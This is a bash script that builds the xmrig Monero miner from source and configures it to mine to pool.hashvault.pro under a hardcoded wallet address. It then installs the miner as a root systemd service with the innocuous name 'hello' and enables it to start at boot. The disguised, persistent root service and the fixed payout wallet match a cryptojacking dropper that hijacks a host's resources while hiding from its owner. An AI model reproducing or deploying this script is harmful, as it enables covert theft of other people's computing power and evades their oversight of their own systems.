#!/bin/bash
apt-get update &&
apt-get install software-properties-common -y &&
add-apt-repository ppa:jonathonf/gcc-7.1 -y &&
apt-get update &&
apt-get install gcc-7 g++-7 -y &&
apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev -y &&
sysctl -w vm.nr_hugepages=128 && cd /usr/local/src/ &&
git clone https://github.com/xmrig/xmrig.git &&
cd xmrig &&
mkdir build &&
cd build &&
cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7 &&
cpucores=$( awk -F: '/model name/ {core++} END {print core}' /proc/cpuinfo ) &&
make -j $cpucores &&

sudo bash -c 'cat <<EOT >>/usr/local/src/xmrig/build/config.json
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "version": 1,
    "background": false,
    "colors": true,
    "randomx": {
        "init": -1,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "asm": true,
        "argon2-impl": null,
        "argon2": [0, 1, 2, 3, 4, 5],
        "cn": [
            [1, 0],
            [1, 1],
            [1, 2],
            [1, 3],
            [1, 4]
        ],
        "cn-heavy": [
            [1, 0],
            [1, 1]
        ],
        "cn-lite": [
            [1, 0],
            [1, 1],
            [1, 2],
            [1, 3],
            [1, 4],
            [1, 5]
        ],
        "cn-pico": [
            [2, 0],
            [2, 1],
            [2, 2],
            [2, 3],
            [2, 4],
            [2, 5]
        ],
        "cn/gpu": [0, 1, 2, 3, 4, 5],
        "rx": [0, 1, 2, 3, 4],
        "rx/wow": [0, 1, 2, 3, 4, 5],
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 5,
    "donate-over-proxy": 1,
    "log-file": null,
    "pools": [
        {
            "algo": null,
            "url": "pool.hashvault.pro:80",
            "user": "4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjXYC8xTdYSfScBAJ",
            "pass": "n2l",
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false
        }
    ],
    "print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "user-agent": null,
    "watch": true
}
EOT
' &&
sudo bash -c 'cat <<EOT >>/lib/systemd/system/hello.service 
[Unit]
Description=hello
After=network.target
[Service]
ExecStart= /usr/local/src/xmrig/build/xmrig
#WatchdogSec=300
#Restart=always
#RestartSec=10
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable hello.service &&
service hello start
